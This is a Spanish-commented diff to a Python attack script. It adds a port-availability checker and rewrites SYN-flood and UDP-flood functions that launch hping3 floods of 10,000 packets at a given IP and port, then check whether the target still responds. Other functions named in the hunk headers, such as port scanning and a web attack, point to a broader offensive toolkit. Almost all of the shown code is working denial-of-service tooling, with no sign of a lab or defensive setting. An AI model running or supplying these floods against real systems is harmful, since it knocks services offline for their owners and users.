@@ -2,6 +2,19 @@ import subprocess
 import time
 import requests
 import paramiko
+import socket
+import signal
+
+
+def check_port(ip, port, timeout=2):
+    try:
+        with socket.create_connection((ip, port), timeout=timeout):
+            print(f"[✔] {ip}:{port} está accesible")
+            return True
+    except Exception:
+        print(f"[✘] {ip}:{port} no responde")
+        return False
+
 
 def scan_ports(ip):
     print(f"[+] Escaneando puertos en {ip}...")
@@ -69,13 +82,43 @@ def web_attack(ip):
     except:
         print("[x] Web inaccesible")
 
+
+#def syn_flood(ip, port):
+#    print(f"[+] Lanzando SYN flood sobre {ip}:{port}...")
+#    subprocess.Popen(["hping3", "-S", "--flood", "-p", str(port), ip])
+
+
 def syn_flood(ip, port):
+    print(f"[+] Verificando disponibilidad previa de {ip}:{port}")
+    check_port(ip, port)
+    
     print(f"[+] Lanzando SYN flood sobre {ip}:{port}...")
-    subprocess.Popen(["hping3", "-S", "--flood", "-p", str(port), ip])
+    subprocess.Popen(["hping3", "-S", "--flood", "-c", "10000", "-p", str(port), ip])
+
+    time.sleep(5)  # Espera unos segundos mientras se ejecuta el ataque
+    print(f"[+] Verificando disponibilidad después del ataque")
+    check_port(ip, port)
+
+
+
+
+#def udp_flood(ip, port):
+#    print(f"[+] Lanzando UDP flood sobre {ip}:{port}...")
+#    subprocess.Popen(["hping3", "--udp", "--flood", "-p", str(port), ip])
+
 
 def udp_flood(ip, port):
+    print(f"[+] Verificando disponibilidad previa de {ip}:{port}")
+    check_port(ip, port)
+    
     print(f"[+] Lanzando UDP flood sobre {ip}:{port}...")
-    subprocess.Popen(["hping3", "--udp", "--flood", "-p", str(port), ip])
+    subprocess.Popen(["hping3", "--udp", "--flood", "-c", "10000", "-p", str(port), ip])
+
+    time.sleep(5)  # Espera unos segundos mientras se ejecuta el ataque
+    print(f"[+] Verificando disponibilidad después del ataque")
+    check_port(ip, port)
+
+
 
 def menu():
 
